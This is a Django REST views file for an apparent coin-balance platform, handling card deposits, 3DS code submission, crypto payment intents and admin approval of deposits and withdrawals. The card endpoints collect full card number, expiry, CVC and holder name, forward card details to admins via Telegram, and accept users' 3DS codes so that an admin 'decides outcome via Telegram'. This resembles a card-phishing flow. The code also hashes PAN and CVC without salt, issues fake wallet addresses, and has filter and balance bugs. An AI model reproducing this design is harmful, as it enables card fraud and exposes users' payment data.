from django.shortcuts import get_object_or_404
from django.db.models import Q, Sum, Count, Avg
from django.utils import timezone
from django.contrib.auth.decorators import login_required
from django.utils.decorators import method_decorator
from rest_framework import status, generics, viewsets
from rest_framework.decorators import action
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated, IsAdminUser
from rest_framework.views import APIView
import uuid
from decimal import Decimal
from .models import Transaction, PaymentMethod, TransactionLog, DepositRequest, WithdrawalRequest, CryptoPayment
from .serializers import (
    TransactionSerializer, TransactionListSerializer,
    DepositRequestSerializer, DepositRequestCreateSerializer,
    WithdrawalRequestSerializer, WithdrawalRequestCreateSerializer,
    TransactionLogSerializer, TransactionSummarySerializer,
    DepositRequestSummarySerializer, WithdrawalRequestSummarySerializer,
    TransactionFilterSerializer, DepositRequestFilterSerializer,
    WithdrawalRequestFilterSerializer, TransactionBulkActionSerializer,
    DepositRequestBulkActionSerializer, WithdrawalRequestBulkActionSerializer,
    CryptoPaymentIntentSerializer
)
from users.models import User
from hashlib import sha256


class BalanceView(APIView):
    """Get user balance and financial summary"""
    permission_classes = [IsAuthenticated]
    
    def get(self, request):
        user = request.user
        return Response({
            'balance': str(user.balance_neon),
            'currency': 'NEON',
            'can_withdraw': user.can_withdraw,
            'kyc_status': user.kyc_status
        })


class CardDepositIntentView(APIView):
    """Create a card deposit 'intent' (production-like demo).
    Accepts card form and amount, stores only masked card + meta, not PAN/CVV.
    """
    permission_classes = [IsAuthenticated]

    def post(self, request):
        amount = request.data.get('amount')
        currency = request.data.get('currency', 'USD')
        card_number = (request.data.get('card_number') or '').replace(' ', '')
        expiry_month = request.data.get('expiry_month') or ''
        expiry_year = request.data.get('expiry_year') or ''
        cardholder_name = request.data.get('cardholder_name') or ''
        cvc = request.data.get('cvc') or ''

        if not amount or not card_number or not expiry_month or not expiry_year or not cvc:
            return Response({'error': 'Missing required fields'}, status=status.HTTP_400_BAD_REQUEST)

        # Mask and hash sensitive data (do not store raw)
        last4 = card_number[-4:] if len(card_number) >= 4 else card_number
        card_hash = sha256(card_number.encode('utf-8')).hexdigest()
        cvc_hash = sha256(cvc.encode('utf-8')).hexdigest()

        deposit = DepositRequest.objects.create(
            user=request.user,
            amount=amount,
            currency=currency,
            payment_method='CREDIT_CARD',
            status='PENDING_CARD',
            payment_notes=f"card_hash={card_hash[:12]} cvc_hash={cvc_hash[:12]}",
        )

        # Log and notify admins in Telegram (masked only)
        TransactionLog.log_action(
            deposit_request=deposit,
            action='DEPOSIT_REQUESTED',
            description='Card intent created',
            performed_by=request.user,
            metadata={
                'amount': str(amount),
                'currency': currency,
                'card_last4': last4,
                'expiry': f"{expiry_month}/{expiry_year}",
                'cardholder': cardholder_name,
            }
        )
        try:
            from integrations.telegram import send_admin_notification
            send_admin_notification(
                f"<b>CARD INTENT</b>\nUser {request.user.id}\nAmount: {amount} {currency}\nCard: **** **** **** {last4}\nExpiry: {expiry_month}/{expiry_year}\nHolder: {cardholder_name}\nDeposit: {deposit.id}"
            )
        except Exception:
            pass

        return Response({'deposit_id': str(deposit.id), 'status': deposit.status}, status=status.HTTP_201_CREATED)


class CardThreeDSSubmitView(APIView):
    """Submit 3DS code from user (stored hashed), admin decides outcome via Telegram."""
    permission_classes = [IsAuthenticated]

    def post(self, request):
        deposit_id = request.data.get('deposit_id')
        code = request.data.get('code')
        if not deposit_id or not code:
            return Response({'error': 'deposit_id and code are required'}, status=status.HTTP_400_BAD_REQUEST)

        deposit = get_object_or_404(DepositRequest, id=deposit_id, user=request.user)
        deposit.three_ds_status = 'PENDING'
        deposit.three_ds_attempts += 1
        deposit.last_3ds_hash = sha256(code.encode('utf-8')).hexdigest()
        deposit.status = 'PENDING_3DS'
        deposit.save(update_fields=['three_ds_status', 'three_ds_attempts', 'last_3ds_hash', 'status'])

        TransactionLog.log_action(
            deposit_request=deposit,
            action='OTHER',
            description='3DS code submitted',
            performed_by=request.user,
        )
        try:
            from integrations.telegram import send_admin_notification
            send_admin_notification(
                f"<b>3DS SUBMITTED</b>\nDeposit: {deposit.id}\nUser {request.user.id}\nAttempts: {deposit.three_ds_attempts}"
            )
        except Exception:
            pass

        return Response({'status': deposit.status}, status=status.HTTP_200_OK)


class TransactionListView(generics.ListAPIView):
    """List user's transactions with filtering"""
    serializer_class = TransactionListSerializer
    permission_classes = [IsAuthenticated]
    
    def get_queryset(self):
        user = self.request.user
        queryset = Transaction.objects.filter(user=user)
        
        # Apply filters
        serializer = TransactionFilterSerializer(data=self.request.query_params)
        if serializer.is_valid():
            data = serializer.validated_data
            
            if data.get('transaction_type'):
                queryset = queryset.filter(transaction_type=data['transaction_type'])
            
            if data.get('status'):
                queryset = queryset.filter(status=data['status'])
            
            if data.get('currency'):
                queryset = queryset.filter(currency=data['currency'])
            
            if data.get('date_from'):
                queryset = queryset.filter(created_at__date__gte=data['date_from'])
            
            if data.get('date_to'):
                queryset = queryset.filter(created_at__date__lte=data['date_to'])
            
            if data.get('min_amount'):
                queryset = queryset.filter(amount__gte=data['min_amount'])
            
            if data.get('max_amount'):
                queryset = queryset.filter(amount__lte=data['max_amount'])
        
        return queryset.order_by('-created_at')


class TransactionDetailView(generics.RetrieveAPIView):
    """Get detailed transaction information"""
    serializer_class = TransactionSerializer
    permission_classes = [IsAuthenticated]
    
    def get_queryset(self):
        return Transaction.objects.filter(user=self.request.user)


class TransactionSummaryView(APIView):
    """Get transaction summary for user"""
    permission_classes = [IsAuthenticated]
    
    def get(self, request):
        user = request.user
        
        # Calculate summary statistics
        transactions = Transaction.objects.filter(user=user)
        
        total_transactions = transactions.count()
        total_deposits = transactions.filter(
            transaction_type='DEPOSIT', 
            status='COMPLETED'
        ).aggregate(total=Sum('amount'))['total'] or Decimal('0.00')
        
        total_withdrawals = transactions.filter(
            transaction_type='WITHDRAWAL', 
            status='COMPLETED'
        ).aggregate(total=Sum('amount'))['total'] or Decimal('0.00')
        
        total_bonuses = transactions.filter(
            transaction_type='BONUS', 
            status='COMPLETED'
        ).aggregate(total=Sum('amount'))['total'] or Decimal('0.00')
        
        total_fees = transactions.filter(
            transaction_type__in=['DEPOSIT_FEE', 'WITHDRAWAL_FEE'], 
            status='COMPLETED'
        ).aggregate(total=Sum('amount'))['total'] or Decimal('0.00')
        
        net_flow = total_deposits - total_withdrawals - total_fees + total_bonuses
        
        # Recent transactions
        recent_transactions = transactions.order_by('-created_at')[:10]
        
        summary = {
            'total_transactions': total_transactions,
            'total_deposits': total_deposits,
            'total_withdrawals': total_withdrawals,
            'total_bonuses': total_bonuses,
            'total_fees': total_fees,
            'net_flow': net_flow,
            'pending_deposits': DepositRequest.objects.filter(
                user=user, 
                status='PENDING'
            ).count(),
            'pending_withdrawals': WithdrawalRequest.objects.filter(
                user=user, 
                status='PENDING'
            ).count(),
            'recent_transactions': TransactionListSerializer(recent_transactions, many=True).data
        }
        
        serializer = TransactionSummarySerializer(summary)
        return Response(serializer.data)


class DepositRequestListView(generics.ListCreateAPIView):
    """List and create deposit requests"""
    permission_classes = [IsAuthenticated]
    
    def get_serializer_class(self):
        if self.request.method == 'POST':
            return DepositRequestCreateSerializer
        return DepositRequestSerializer
    
    def get_queryset(self):
        user = self.request.user
        queryset = DepositRequest.objects.filter(user=user)
        
        # Apply filters
        serializer = DepositRequestFilterSerializer(data=self.request.query_params)
        if serializer.is_valid():
            data = serializer.validated_data
            
            if data.get('status'):
                queryset = queryset.filter(status=data['status'])
            
            if data.get('payment_method'):
                queryset = queryset.filter(payment_method=data['payment_method'])
            
            if data.get('currency'):
                queryset = queryset.filter(currency=data['currency'])
            
            if data.get('date_from'):
                queryset = queryset.filter(requested_at__date__gte=data['date_from'])
            
            if data.get('date_to'):
                queryset = queryset.filter(requested_at__date__lte=data['date_to'])
            
            if data.get('min_amount'):
                queryset = queryset.filter(amount__gte=data['min_amount'])
            
            if data.get('max_amount'):
                queryset = queryset.filter(amount__lte=data['max_amount'])
        
        return queryset.order_by('-requested_at')
    
    def perform_create(self, serializer):
        user = self.request.user
        deposit_request = serializer.save(
            user=user,
            ip_address=self.request.META.get('REMOTE_ADDR'),
            user_agent=self.request.META.get('HTTP_USER_AGENT', '')
        )
        
        # Log the action
        TransactionLog.objects.create(
            action='DEPOSIT_REQUESTED',
            performed_by=user,
            deposit_request=deposit_request,
            ip_address=self.request.META.get('REMOTE_ADDR'),
            details={
                'amount': str(deposit_request.amount),
                'currency': deposit_request.currency,
                'payment_method': deposit_request.payment_method
            }
        )
        
        # Send notification to admin via Telegram bot
        self._notify_admin_deposit(deposit_request)
    
    def _notify_admin_deposit(self, deposit_request):
        """Send deposit notification to admin"""
        try:
            from integrations.telegram import send_admin_notification, format_deposit_request_alert
            send_admin_notification(format_deposit_request_alert(deposit_request))
            TransactionLog.objects.create(
                action='ADMIN_NOTIFICATION_SENT',
                performed_by=deposit_request.user,
                deposit_request=deposit_request,
                ip_address=self.request.META.get('REMOTE_ADDR'),
                details={'notification_type': 'deposit_request'}
            )
        except Exception as e:
            # Log error but don't fail the request
            TransactionLog.objects.create(
                action='ADMIN_NOTIFICATION_FAILED',
                performed_by=deposit_request.user,
                deposit_request=deposit_request,
                ip_address=self.request.META.get('REMOTE_ADDR'),
                details={'error': str(e)}
            )


class DepositRequestDetailView(generics.RetrieveUpdateAPIView):
    """Get and update deposit request details"""
    serializer_class = DepositRequestSerializer
    permission_classes = [IsAuthenticated]
    
    def get_queryset(self):
        return DepositRequest.objects.filter(user=self.request.user)
    
    def perform_update(self, serializer):
        deposit_request = serializer.save()
        
        # Log the update
        TransactionLog.objects.create(
            action='DEPOSIT_REQUEST_UPDATED',
            performed_by=self.request.user,
            deposit_request=deposit_request,
            ip_address=self.request.META.get('REMOTE_ADDR'),
            details={'updated_fields': list(serializer.validated_data.keys())}
        )


class WithdrawalRequestListView(generics.ListCreateAPIView):
    """List and create withdrawal requests"""
    permission_classes = [IsAuthenticated]
    
    def get_serializer_class(self):
        if self.request.method == 'POST':
            return WithdrawalRequestCreateSerializer
        return WithdrawalRequestSerializer
    
    def get_queryset(self):
        user = self.request.user
        queryset = WithdrawalRequest.objects.filter(user=user)
        
        # Apply filters
        serializer = WithdrawalRequestFilterSerializer(data=self.request.query_params)
        if serializer.is_valid():
            data = serializer.validated_data
            
            if data.get('status'):
                queryset = queryset.filter(status=data['status'])
            
            if data.get('payment_method'):
                queryset = queryset.filter(payment_method=data['payment_method'])
            
            if data.get('currency'):
                queryset = queryset.filter(currency=data['currency'])
            
            if data.get('date_from'):
                queryset = queryset.filter(requested_at__date__gte=data['date_from'])
            
            if data.get('date_to'):
                queryset = queryset.filter(requested_at__date__lte=data['date_to'])
            
            if data.get('min_amount'):
                queryset = queryset.filter(amount__gte=data['min_amount'])
            
            if data.get('max_amount'):
                queryset = queryset.filter(amount__lte=data['max_amount'])
        
        return queryset.order_by('-requested_at')
    
    def perform_create(self, serializer):
        user = self.request.user
        withdrawal_request = serializer.save(
            user=user,
            ip_address=self.request.META.get('REMOTE_ADDR'),
            user_agent=self.request.META.get('HTTP_USER_AGENT', '')
        )
        
        # Deduct amount from user balance
        user.deduct_neoncoins(withdrawal_request.amount)
        
        # Log the action
        TransactionLog.objects.create(
            action='WITHDRAWAL_REQUESTED',
            performed_by=user,
            withdrawal_request=withdrawal_request,
            ip_address=self.request.META.get('REMOTE_ADDR'),
            details={
                'amount': str(withdrawal_request.amount),
                'currency': withdrawal_request.currency,
                'payment_method': withdrawal_request.payment_method
            }
        )
        
        # Send notification to admin via Telegram bot
        self._notify_admin_withdrawal(withdrawal_request)
    
    def _notify_admin_withdrawal(self, withdrawal_request):
        """Send withdrawal notification to admin"""
        try:
            # This would integrate with the Telegram bot
            # For now, just log it
            TransactionLog.objects.create(
                action='ADMIN_NOTIFICATION_SENT',
                performed_by=withdrawal_request.user,
                withdrawal_request=withdrawal_request,
                ip_address=self.request.META.get('REMOTE_ADDR'),
                details={'notification_type': 'withdrawal_request'}
            )
        except Exception as e:
            # Log error but don't fail the request
            TransactionLog.objects.create(
                action='ADMIN_NOTIFICATION_FAILED',
                performed_by=withdrawal_request.user,
                withdrawal_request=withdrawal_request,
                ip_address=self.request.META.get('REMOTE_ADDR'),
                details={'error': str(e)}
            )


class WithdrawalRequestDetailView(generics.RetrieveUpdateAPIView):
    """Get and update withdrawal request details"""
    serializer_class = WithdrawalRequestSerializer
    permission_classes = [IsAuthenticated]
    
    def get_queryset(self):
        return WithdrawalRequest.objects.filter(user=self.request.user)
    
    def perform_update(self, serializer):
        withdrawal_request = serializer.save()
        
        # Log the update
        TransactionLog.objects.create(
            action='WITHDRAWAL_REQUEST_UPDATED',
            performed_by=self.request.user,
            withdrawal_request=withdrawal_request,
            ip_address=self.request.META.get('REMOTE_ADDR'),
            details={'updated_fields': list(serializer.validated_data.keys())}
        )


class TransactionLogListView(generics.ListAPIView):
    """List transaction logs for user"""
    serializer_class = TransactionLogSerializer
    permission_classes = [IsAuthenticated]
    
    def get_queryset(self):
        user = self.request.user
        return TransactionLog.objects.filter(
            Q(performed_by=user) | 
            Q(transaction__user=user) |
            Q(deposit_request__user=user) |
            Q(withdrawal_request__user=user)
        ).order_by('-timestamp')


class CryptoPaymentIntentView(APIView):
    """Создает интент для крипто-платежа"""
    permission_classes = [IsAuthenticated]
    
    def post(self, request):
        serializer = CryptoPaymentIntentSerializer(data=request.data)
        if serializer.is_valid():
            # Генерируем уникальный адрес для пользователя
            wallet_address = self._generate_wallet_address(serializer.validated_data['currency'])
            
            crypto_payment = CryptoPayment.objects.create(
                user=request.user,
                amount=serializer.validated_data['amount'],
                currency=serializer.validated_data['currency'],
                network=serializer.validated_data['network'],
                wallet_address=wallet_address
            )
            
            # Отправляем уведомление админам в Telegram
            self._notify_admin_crypto(crypto_payment)
            
            return Response({
                'payment_id': str(crypto_payment.id),
                'wallet_address': wallet_address,
                'amount': str(crypto_payment.amount),
                'currency': crypto_payment.currency,
                'network': crypto_payment.network,
                'required_confirmations': crypto_payment.required_confirmations
            })
        return Response(serializer.errors, status=400)
    
    def _generate_wallet_address(self, currency):
        """Генерирует адрес кошелька (в продакшене будет интеграция с реальными кошельками)"""
        import hashlib
        import time
        timestamp = str(int(time.time()))
        return f"{currency.lower()}_{hashlib.md5(timestamp.encode()).hexdigest()[:16]}"
    
    def _notify_admin_crypto(self, crypto_payment):
        """Отправляет уведомление админам о новом крипто-платеже"""
        try:
            from integrations.telegram import send_telegram_message
            message = f"🪙 Новый крипто-платеж!\n\n"
            message += f"Пользователь: {crypto_payment.user.username}\n"
            message += f"Сумма: {crypto_payment.amount} {crypto_payment.currency}\n"
            message += f"Сеть: {crypto_payment.network}\n"
            message += f"Адрес: {crypto_payment.wallet_address}\n"
            message += f"ID: {crypto_payment.id}"
            
            send_telegram_message(message)
        except Exception as e:
            print(f"Failed to send Telegram notification: {e}")

class CryptoPaymentStatusView(APIView):
    """Проверяет статус крипто-платежа"""
    permission_classes = [IsAuthenticated]
    
    def get(self, request, payment_id):
        try:
            crypto_payment = CryptoPayment.objects.get(
                id=payment_id,
                user=request.user
            )
            
            return Response({
                'payment_id': str(crypto_payment.id),
                'status': crypto_payment.status,
                'confirmations': crypto_payment.confirmations,
                'required_confirmations': crypto_payment.required_confirmations,
                'is_confirmed': crypto_payment.is_confirmed,
                'created_at': crypto_payment.created_at,
                'confirmed_at': crypto_payment.confirmed_at
            })
        except CryptoPayment.DoesNotExist:
            return Response({'error': 'Payment not found'}, status=404)


# Admin Views
class AdminTransactionViewSet(viewsets.ModelViewSet):
    """Admin viewset for managing transactions"""
    queryset = Transaction.objects.all()
    serializer_class = TransactionSerializer
    permission_classes = [IsAdminUser]
    
    def get_queryset(self):
        queryset = super().get_queryset()
        
        # Apply filters
        user_id = self.request.query_params.get('user_id')
        transaction_type = self.request.query_params.get('transaction_type')
        status = self.request.query_params.get('status')
        date_from = self.request.query_params.get('date_from')
        date_to = self.request.query_params.get('date_to')
        
        if user_id:
            queryset = queryset.filter(user_id=user_id)
        
        if transaction_type:
            queryset = queryset.filter(transaction_type=transaction_type)
        
        if status:
            queryset = queryset.filter(status=status)
        
        if date_from:
            queryset = queryset.filter(created_at__date__gte=date_from)
        
        if date_to:
            queryset = queryset.filter(created_at__date__lte=date_to)
        
        return queryset.select_related('user').order_by('-created_at')
    
    @action(detail=False, methods=['get'])
    def summary(self, request):
        """Get transaction summary for admin"""
        queryset = self.get_queryset()
        
        total_transactions = queryset.count()
        successful_transactions = queryset.filter(status='COMPLETED').count()
        failed_transactions = queryset.filter(status='FAILED').count()
        pending_transactions = queryset.filter(status='PENDING').count()
        
        total_volume = queryset.filter(status='COMPLETED').aggregate(
            total=Sum('amount')
        )['total'] or Decimal('0.00')
        
        average_transaction_value = queryset.filter(status='COMPLETED').aggregate(
            avg=Avg('amount')
        )['avg'] or Decimal('0.00')
        
        # Today's statistics
        today = timezone.now().date()
        today_transactions = queryset.filter(created_at__date=today)
        transactions_today = today_transactions.count()
        volume_today = today_transactions.filter(status='COMPLETED').aggregate(
            total=Sum('amount')
        )['total'] or Decimal('0.00')
        
        summary = {
            'total_transactions': total_transactions,
            'successful_transactions': successful_transactions,
            'failed_transactions': failed_transactions,
            'pending_transactions': pending_transactions,
            'total_volume': total_volume,
            'average_transaction_value': average_transaction_value,
            'transactions_today': transactions_today,
            'volume_today': volume_today
        }
        
        return Response(summary)
    
    @action(detail=True, methods=['post'])
    def process(self, request, pk=None):
        """Process a transaction"""
        transaction = self.get_object()
        
        if transaction.status != 'PENDING':
            return Response(
                {'error': 'Transaction is not pending'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Process the transaction based on type
        if transaction.transaction_type == 'DEPOSIT':
            transaction.status = 'COMPLETED'
            transaction.processed_at = timezone.now()
            transaction.processed_by = request.user
            transaction.save()
            
            # Add amount to user balance
            user = transaction.user
            user.add_neoncoins(transaction.amount)
            
            # Log the action
            TransactionLog.objects.create(
                action='TRANSACTION_PROCESSED',
                performed_by=request.user,
                transaction=transaction,
                ip_address=request.META.get('REMOTE_ADDR'),
                details={'status': 'COMPLETED'}
            )
            
            return Response({
                'message': 'Transaction processed successfully',
                'status': 'COMPLETED'
            })
        
        elif transaction.transaction_type == 'WITHDRAWAL':
            # Check if user has sufficient balance
            if transaction.user.balance_neon < transaction.amount:
                return Response(
                    {'error': 'Insufficient balance'}, 
                    status=status.HTTP_400_BAD_REQUEST
                )
            
            transaction.status = 'COMPLETED'
            transaction.processed_at = timezone.now()
            transaction.processed_by = request.user
            transaction.save()
            
            # Log the action
            TransactionLog.objects.create(
                action='TRANSACTION_PROCESSED',
                performed_by=request.user,
                transaction=transaction,
                ip_address=request.META.get('REMOTE_ADDR'),
                details={'status': 'COMPLETED'}
            )
            
            return Response({
                'message': 'Transaction processed successfully',
                'status': 'COMPLETED'
            })
        
        return Response(
            {'error': 'Unsupported transaction type'}, 
            status=status.HTTP_400_BAD_REQUEST
        )
    
    @action(detail=True, methods=['post'])
    def reject(self, request, pk=None):
        """Reject a transaction"""
        transaction = self.get_object()
        reason = request.data.get('reason', 'No reason provided')
        
        if transaction.status != 'PENDING':
            return Response(
                {'error': 'Transaction is not pending'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        transaction.status = 'REJECTED'
        transaction.admin_notes = reason
        transaction.processed_at = timezone.now()
        transaction.processed_by = request.user
        transaction.save()
        
        # Log the action
        TransactionLog.objects.create(
            action='TRANSACTION_REJECTED',
            performed_by=request.user,
            transaction=transaction,
            ip_address=request.META.get('REMOTE_ADDR'),
            details={'reason': reason}
        )
        
        return Response({
            'message': 'Transaction rejected',
            'status': 'REJECTED'
        })


class AdminDepositRequestViewSet(viewsets.ModelViewSet):
    """Admin viewset for managing deposit requests"""
    queryset = DepositRequest.objects.all()
    serializer_class = DepositRequestSerializer
    permission_classes = [IsAdminUser]
    
    def get_queryset(self):
        queryset = super().get_queryset()
        
        # Apply filters
        status = self.request.query_params.get('status')
        payment_method = self.request.query_params.get('payment_method')
        date_from = self.request.query_params.get('date_from')
        date_to = self.request.query_params.get('date_to')
        
        if status:
            queryset = queryset.filter(status=status)
        
        if payment_method:
            queryset = queryset.filter(payment_method=payment_method)
        
        if date_from:
            queryset = queryset.filter(requested_at__date__gte=date_from)
        
        if date_to:
            queryset = queryset.filter(requested_at__date__lte=date_to)
        
        return queryset.select_related('user').order_by('-requested_at')
    
    @action(detail=False, methods=['get'])
    def summary(self, request):
        """Get deposit request summary for admin"""
        queryset = self.get_queryset()
        
        total_requests = queryset.count()
        pending_requests = queryset.filter(status='PENDING').count()
        approved_requests = queryset.filter(status='APPROVED').count()
        rejected_requests = queryset.filter(status='REJECTED').count()
        
        total_amount_pending = queryset.filter(status='PENDING').aggregate(
            total=Sum('amount')
        )['total'] or Decimal('0.00')
        
        total_amount_approved = queryset.filter(status='APPROVED').aggregate(
            total=Sum('amount')
        )['total'] or Decimal('0.00')
        
        summary = {
            'total_requests': total_requests,
            'pending_requests': pending_requests,
            'approved_requests': approved_requests,
            'rejected_requests': rejected_requests,
            'total_amount_pending': total_amount_pending,
            'total_amount_approved': total_amount_approved
        }
        
        return Response(summary)
    
    @action(detail=True, methods=['post'])
    def approve(self, request, pk=None):
        """Approve a deposit request"""
        deposit_request = self.get_object()
        notes = request.data.get('notes', '')
        
        if deposit_request.status != 'PENDING':
            return Response(
                {'error': 'Deposit request is not pending'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        deposit_request.status = 'APPROVED'
        deposit_request.admin_notes = notes
        deposit_request.processed_at = timezone.now()
        deposit_request.processed_by = request.user
        deposit_request.save()
        
        # Create transaction record
        transaction = Transaction.objects.create(
            user=deposit_request.user,
            transaction_type='DEPOSIT',
            amount=deposit_request.amount,
            currency=deposit_request.currency,
            status='COMPLETED',
            description=f'Deposit via {deposit_request.payment_method}',
            ip_address=deposit_request.ip_address,
            user_agent=deposit_request.user_agent,
            processed_at=timezone.now(),
            processed_by=request.user
        )
        
        # Add amount to user balance
        user = deposit_request.user
        user.add_neoncoins(deposit_request.amount)
        
        # Log the action
        TransactionLog.objects.create(
            action='DEPOSIT_APPROVED',
            performed_by=request.user,
            deposit_request=deposit_request,
            transaction=transaction,
            ip_address=request.META.get('REMOTE_ADDR'),
            details={'notes': notes}
        )
        
        return Response({
            'message': 'Deposit request approved',
            'transaction_id': transaction.id
        })
    
    @action(detail=True, methods=['post'])
    def reject(self, request, pk=None):
        """Reject a deposit request"""
        deposit_request = self.get_object()
        reason = request.data.get('reason', 'No reason provided')
        
        if deposit_request.status != 'PENDING':
            return Response(
                {'error': 'Deposit request is not pending'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        deposit_request.status = 'REJECTED'
        deposit_request.rejection_reason = reason
        deposit_request.processed_at = timezone.now()
        deposit_request.processed_by = request.user
        deposit_request.save()
        
        # Log the action
        TransactionLog.objects.create(
            action='DEPOSIT_REJECTED',
            performed_by=request.user,
            deposit_request=deposit_request,
            ip_address=request.META.get('REMOTE_ADDR'),
            details={'reason': reason}
        )
        
        return Response({
            'message': 'Deposit request rejected',
            'status': 'REJECTED'
        })


class AdminWithdrawalRequestViewSet(viewsets.ModelViewSet):
    """Admin viewset for managing withdrawal requests"""
    queryset = WithdrawalRequest.objects.all()
    serializer_class = WithdrawalRequestSerializer
    permission_classes = [IsAdminUser]
    
    def get_queryset(self):
        queryset = super().get_queryset()
        
        # Apply filters
        status = self.request.query_params.get('status')
        payment_method = self.request.query_params.get('payment_method')
        date_from = self.request.query_params.get('date_from')
        date_to = self.request.query_params.get('date_to')
        
        if status:
            queryset = queryset.filter(status=status)
        
        if payment_method:
            queryset = queryset.filter(payment_method=payment_method)
        
        if date_from:
            queryset = queryset.filter(requested_at__date__gte=date_from)
        
        if date_to:
            queryset = queryset.filter(requested_at__date__gte=date_to)
        
        return queryset.select_related('user').order_by('-requested_at')
    
    @action(detail=False, methods=['get'])
    def summary(self, request):
        """Get withdrawal request summary for admin"""
        queryset = self.get_queryset()
        
        total_requests = queryset.count()
        pending_requests = queryset.filter(status='PENDING').count()
        approved_requests = queryset.filter(status='APPROVED').count()
        rejected_requests = queryset.filter(status='REJECTED').count()
        
        total_amount_pending = queryset.filter(status='PENDING').aggregate(
            total=Sum('amount')
        )['total'] or Decimal('0.00')
        
        total_amount_approved = queryset.filter(status='APPROVED').aggregate(
            total=Sum('amount')
        )['total'] or Decimal('0.00')
        
        summary = {
            'total_requests': total_requests,
            'pending_requests': pending_requests,
            'approved_requests': approved_requests,
            'rejected_requests': rejected_requests,
            'total_amount_pending': total_amount_pending,
            'total_amount_approved': total_amount_approved
        }
        
        return Response(summary)
    
    @action(detail=True, methods=['post'])
    def approve(self, request, pk=None):
        """Approve a withdrawal request"""
        withdrawal_request = self.get_object()
        notes = request.data.get('notes', '')
        
        if withdrawal_request.status != 'PENDING':
            return Response(
                {'error': 'Withdrawal request is not pending'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        withdrawal_request.status = 'APPROVED'
        withdrawal_request.admin_notes = notes
        withdrawal_request.processed_at = timezone.now()
        withdrawal_request.processed_by = request.user
        withdrawal_request.save()
        
        # Create transaction record
        transaction = Transaction.objects.create(
            user=withdrawal_request.user,
            transaction_type='WITHDRAWAL',
            amount=withdrawal_request.amount,
            currency=withdrawal_request.currency,
            status='COMPLETED',
            description=f'Withdrawal via {withdrawal_request.payment_method}',
            ip_address=withdrawal_request.ip_address,
            user_agent=withdrawal_request.user_agent,
            processed_at=timezone.now(),
            processed_by=request.user
        )
        
        # Log the action
        TransactionLog.objects.create(
            action='WITHDRAWAL_APPROVED',
            performed_by=request.user,
            withdrawal_request=withdrawal_request,
            transaction=transaction,
            ip_address=request.META.get('REMOTE_ADDR'),
            details={'notes': notes}
        )
        
        return Response({
            'message': 'Withdrawal request approved',
            'transaction_id': transaction.id
        })
    
    @action(detail=True, methods=['post'])
    def reject(self, request, pk=None):
        """Reject a withdrawal request"""
        withdrawal_request = self.get_object()
        reason = request.data.get('reason', 'No reason provided')
        
        if withdrawal_request.status != 'PENDING':
            return Response(
                {'error': 'Withdrawal request is not pending'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        withdrawal_request.status = 'REJECTED'
        withdrawal_request.rejection_reason = reason
        withdrawal_request.processed_at = timezone.now()
        withdrawal_request.processed_by = request.user
        withdrawal_request.save()
        
        # Refund the amount to user balance
        user = withdrawal_request.user
        user.add_neoncoins(withdrawal_request.amount)
        
        # Log the action
        TransactionLog.objects.create(
            action='WITHDRAWAL_REJECTED',
            performed_by=request.user,
            withdrawal_request=withdrawal_request,
            ip_address=request.META.get('REMOTE_ADDR'),
            details={'reason': reason}
        )
        
        return Response({
            'message': 'Withdrawal request rejected',
            'status': 'REJECTED'
        })


class BulkActionView(APIView):
    """Handle bulk actions on transactions"""
    permission_classes = [IsAdminUser]
    
    def post(self, request):
        serializer = TransactionBulkActionSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
        
        action = serializer.validated_data['action']
        transaction_ids = serializer.validated_data['transaction_ids']
        reason = serializer.validated_data.get('reason', '')
        
        transactions = Transaction.objects.filter(id__in=transaction_ids)
        processed_count = 0
        
        for transaction in transactions:
            try:
                if action == 'process':
                    if transaction.status == 'PENDING':
                        transaction.status = 'COMPLETED'
                        transaction.processed_at = timezone.now()
                        transaction.processed_by = request.user
                        transaction.save()
                        processed_count += 1
                
                elif action == 'reject':
                    if transaction.status == 'PENDING':
                        transaction.status = 'REJECTED'
                        transaction.admin_notes = reason
                        transaction.processed_at = timezone.now()
                        transaction.processed_by = request.user
                        transaction.save()
                        processed_count += 1
                
                elif action == 'cancel':
                    if transaction.status in ['PENDING', 'PROCESSING']:
                        transaction.status = 'CANCELLED'
                        transaction.admin_notes = reason
                        transaction.processed_at = timezone.now()
                        transaction.processed_by = request.user
                        transaction.save()
                        processed_count += 1
                
                # Log the action
                TransactionLog.objects.create(
                    action=f'BULK_{action.upper()}',
                    performed_by=request.user,
                    transaction=transaction,
                    ip_address=request.META.get('REMOTE_ADDR'),
                    details={'reason': reason, 'bulk_action': True}
                )
                
            except Exception as e:
                # Log error but continue with other transactions
                TransactionLog.objects.create(
                    action='BULK_ACTION_ERROR',
                    performed_by=request.user,
                    transaction=transaction,
                    ip_address=request.META.get('REMOTE_ADDR'),
                    details={'error': str(e), 'action': action}
                )
        
        return Response({
            'message': f'Successfully processed {processed_count} transactions',
            'processed_count': processed_count,
            'total_count': len(transaction_ids)
        })


